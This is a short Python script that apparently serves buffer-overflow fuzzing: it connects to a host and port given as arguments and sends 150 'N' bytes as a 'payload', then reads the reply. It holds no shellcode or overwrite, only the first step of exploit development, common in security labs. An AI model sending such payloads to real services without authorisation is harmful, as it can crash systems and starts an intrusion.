#!/usr/bin/env python3
import socket, sys


RHOST = sys.argv[1]
RPORT = int(sys.argv[2])


# Handle Connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))


# Handle Payload 
payload = "\x4E"
payload_size = 150
postfix = "\n"
buff = bytes(payload  * payload_size + postfix, encoding="ascii")


# Payload Status
s.send(buff)
print("[+] - Sendng Payload - [ {} Bytes ]".format(len(buff) - len(postfix)))


# Handle Response
response = s.recv(1024)
